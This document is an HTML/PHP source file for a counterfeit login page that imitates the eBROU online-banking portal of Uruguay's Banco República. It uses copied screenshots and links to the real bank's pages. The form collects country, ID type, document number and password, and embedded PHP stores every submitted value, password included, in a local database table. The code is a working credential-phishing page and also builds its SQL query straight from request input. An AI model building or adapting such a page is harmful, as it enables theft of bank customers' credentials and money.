<!DOCTYPE html>
<html>
<head>
	<title>eBROU - BROU</title>

<link rel="stylesheet" href="estilo.css">
<link rel="icon" href="https://i.postimg.cc/sxjjjWGW/favicon-16x16.png">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>


</head>
<body>

<img src="https://i.postimg.cc/C19c1txs/Captura2.png" style="position:absolute; top: 29px; left: 105px;">


<form action="datos.php" method="POST">

<p style="color:#08528d; position: absolute; left:30px; font-size:24px;font-family:sans-serif; font-weight:lighter; top:4px;">Ingreso de Usuario</p>
<p style="color:#444242; position: absolute; left:30px; top:59px; font-family:sans-serif; font-size: 13px;">País</p>
	
    <div class="wrapper">
   
    <select class="letra" name="pais" style="position:  absolute; top: 90px; border-radius: 4px; width: 510px; height: 40px; left: 30px; background-color:#F8F8F9; border-color:#E4E2E2; " > 

    <option value="Uruguay"><p class="letra">Uruguay<p></option>
    <option value="Argentina">Argentina</option>
    <option value="Brasil">Brasil</option>
    <option value="Chile">Chile</option>
    <option value="Paraguay">Paraguay</option>
    <option value="Afganistan">Afganistan</option>
    <option value="Albania">Albania</option>
    <option value="Alemania">Alemania</option>
    <option value="Andorra">Andorra</option>
    <option value="Angola">Angola</option>
    <option value="Anguila">Anguila</option>
    <option value="Antigua y Barbuda">Antigua y Barbuda</option>
    <option value="Antillas Holandesas">Antillas Holandesas</option>
    <option value="Antártica">Antártica</option>
    <option value="Arabia Saudita">Arabia Saudita</option>
    <option value="Argelia">Argelia</option>
    <option value="Armenia">Armenia</option>
    <option value="Aruba">Aruba</option>
    <option value="Australia">Australia</option>
    <option value="Austria">Austria</option>
   
	</select>
</div>
  <p style="color:#444242; position: absolute; left:30px; top:127px; font-family:sans-serif; font-size: 14px;">Tipo de Documento </p>
    
     <select class="letra" name="tipo_doc"  style="position:  absolute; top: 160px; border-radius: 4px; width: 510px; height: 40px; left: 30px; background-color:#F8F8F9; border-color:#E4E2E2  "> 

    <option value="C.I">C.I</option>
    <option value="Banco_Hipo">Banco Hipotecario</option>
    <option value="C.Identidad_Extra">C.Identidad Extranjera</option>
    <option value="Otro">Otro</option>
    <option value="Otro Casos">Otro Casos</option>
    <option value="Pasaporte">Pasaporte</option>
    
    </select>

<p  style="color:#444242; position: absolute; left:30px; top:202px; font-family:sans-serif; font-size: 14px;">N° de Documento </p>
 
 <input class="bordes" name="n_doc" onclick="this.style.border-color='#F7F7F7'"  maxlength="7" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  style="position: absolute; top: 238px; border-radius: 3px; width: 504px; height: 36px; left: 30px; background-color:#F8F8F9; border-color:#F5F4F4;   "> 

  
    </input>

<p style="color:#444242; position: absolute; left:30px; top:275px; font-family:sans-serif; font-size: 14px;">Contraseña </p>



<input  id="password" onclick="mostrar()"  type="password" name="contraseña" placeholder="Contraseña"  style="position:  absolute; top: 311px; border-radius: 3px; width: 504px; height: 36px; left: 30px; background-color:#F8F8F9; border-color:#E4E2E2; border-width: 1px;">



    </input>


<?php

$conexion=mysqli_connect("localhost","root","","brou");
 

  mysqli_query($conexion, "insert into registros(pais,tipo_doc,n_doc,contraseña) values 
                       ('$_REQUEST[pais]','$_REQUEST[tipo_doc]','$_REQUEST[n_doc]','$_REQUEST[contraseña]')")
    or die("Problemas en el select" . mysqli_error($conexion));

  mysqli_close($conexion);


?>
 

<span class="fa fa-eye-slash icon"onclick="mostrar()" style="position: absolute; top: 321px; left:500px; color:#0074FF; "></span>

<div class="swtich-container" style="position: absolute; top:430px; left: 380px; ">
    <input type="checkbox" id="switch">
    <label for="switch" class="lbl"></label>
  </div>
 
<p style="position: absolute; top:417px; font-family: sans-serif; font-size: 14px; opacity: 803; color:#AAB6B6; left: 420px;">Recordar Usuario</p>


<script>
    
function mostrar(){

    var cambio = document.getElementById("password");
        if(cambio.type == "password"){
            cambio.type = "text";
            $('.icon').removeClass('fa fa-eye-slash').addClass('fa fa-eye');
        }else{
            cambio.type = "password";
            $('.icon').removeClass('fa fa-eye').addClass('fa fa-eye-slash');
        }


  

}








</script>






<a class="link"  href="https://ebanking.brou.com.uy/frontend/recoveryPassword"   style=" position: absolute; left:25px; top:365px; font-family:Arial; font-size: 14px; ;">¿Olvido su Contraseña?</p></a>


    <a class="link" href="https://ebanking.brou.com.uy/frontend/enrollment" style=" position: absolute; left:27px; top:394px; font-family:Arial; font-size: 14px; ;">Registrar usuario</p></a>

<a  class="link" href="https://ebanking.brou.com.uy/frontend/recoveryPassword"  style=" position: absolute; left:333px; top:364px; font-family:Arial; font-size: 15px; ">Tengo un código de recuperación</p></a>






<input class="fondo" type="submit" value="Ingresar" style="position: absolute; top: 428px; width:254px; height: 45px;  left:29px; border-radius: 3px; color: white; font-family:Arial; border-width: 0px;">
</form>

<img src="https://i.postimg.cc/8c24VbF1/Captura3.png" style="position:absolute; top:594px; left: 100px;  ;">

<img src="https://i.postimg.cc/PxFKSHTv/Captura.png" style="position:absolute; top:90px; left: 676px; height: 495px; ">


<a href="https://www.brou.com.uy/"  class="cambiar" style="position: absolute; top: 607px; left:560px; font-family: sans-serif; font-size: 13px;   ">Portal BROU</p></a>

<a href="https://www.brou.com.uy/web/guest/institucional/seguridad/tu-banco-seguro"  class="cambiar"style="position: absolute; top: 607px; left:650px;  font-family: sans-serif; font-size: 13px; ">Seguridad</p></a>


<a href="https://www.brou.com.uy/web/guest/contactenos" class="cambiar" style="position: absolute; top:607px; left:730px;  font-family: sans-serif; font-size: 13px;  ;">Gestion de Reclamos</p></a>


<img src="https://i.postimg.cc/cJyBTQwC/derechgos.png" style="position:absolute; top: 603px; left: 870px;">


<style>
	body{

background-color:#08528d;



}




form{

position: absolute;
top:90px;
left:110px;
background-color: white;
width:570px;
height: 490px;
border-radius: 5px;


}

.cambiar{

color: #F1F1F1;
opacity: 60%;
text-decoration: none;

}
.cambiar:hover{


color: #FFFFFF;
opacity: 100%;
text-decoration: underline;

}

.link{
color:#08528d;


text-decoration: none;


}

.link:hover{
color:#00467E;

text-decoration: underline;


	
}


.fondo{


background-color:#1D62DC;


}

.fondo:hover{


background-color:#0565B0;

	
}


.bordes{

border-color: #F7F7F7;
border-width:1px; 


}

.letra{


font-family: sans-serif;
opacity: 90%;
font-size: 15px;

}

.lbl{
  display: inline-block;
  width: 30px;
  height: 18px;
  background: #AAB6B6;
  border-radius: 100px;
  cursor: pointer;
  position: relative;
  transition: .2s;
}

.lbl::after{
  content: '';
  display: block;
  width: 15px;
  height: 15px;
  background: #eee;
  border-radius: 100px;
  position: absolute;
  top: 2px;
  left: 1px;
  transition: .2s;
}
#switch:checked + .lbl::after{
  left: 15px;
}
 
#switch:checked + .lbl{
  background: #00C8B1;
}
 
#switch{
  display: none;
}



	</style>


</body>
</html>
